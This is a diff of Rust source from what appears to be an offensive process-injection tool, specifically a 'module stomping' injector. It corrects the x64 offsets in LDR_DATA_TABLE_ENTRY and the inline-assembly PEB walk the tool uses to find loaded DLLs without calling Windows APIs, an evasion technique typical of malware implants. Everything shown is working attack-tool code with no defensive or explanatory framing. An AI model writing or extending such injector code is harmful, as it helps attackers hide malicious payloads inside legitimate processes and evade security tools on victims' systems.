@@ -101,11 +101,12 @@ impl Injector for ModuleStompInjector {
             //
             // PEB walk (x86-64): TEB @ gs:[0x30] → PEB @ TEB+0x60 →
             // Ldr @ PEB+0x18 → InLoadOrderModuleList head @ Ldr+0x10.
-            // LDR_DATA_TABLE_ENTRY offsets (x86-64):
+            // LDR_DATA_TABLE_ENTRY offsets (x86-64) when entry pointer is the
+            // InLoadOrderLinks.Flink (i.e. the entry's base address):
             //   +0x00  InLoadOrderLinks.Flink
-            //   +0x20  DllBase
-            //   +0x40  BaseDllName.Length (u16, byte count)
-            //   +0x48  BaseDllName.Buffer (pointer to UTF-16)
+            //   +0x30  DllBase
+            //   +0x58  BaseDllName.Length (u16, byte count)
+            //   +0x60  BaseDllName.Buffer (pointer to UTF-16)
             let target_dll: Option<String> = unsafe {
                 use core::arch::asm;
                 let teb: usize;
@@ -117,9 +118,9 @@ impl Injector for ModuleStompInjector {
 
                 let mut found: Option<String> = None;
                 while entry as usize != list_head {
-                    let base = *(entry.add(0x20) as *const usize);
-                    let name_len = *(entry.add(0x40) as *const u16) as usize / 2;
-                    let name_ptr = *(entry.add(0x48) as *const usize) as *const u16;
+                    let base = *(entry.add(0x30) as *const usize); // DllBase
+                    let name_len = *(entry.add(0x58) as *const u16) as usize / 2; // BaseDllName.Length
+                    let name_ptr = *(entry.add(0x60) as *const usize) as *const u16; // BaseDllName.Buffer
 
                     if base != 0 && !name_ptr.is_null() && name_len > 0 {
                         let slice = std::slice::from_raw_parts(name_ptr, name_len);
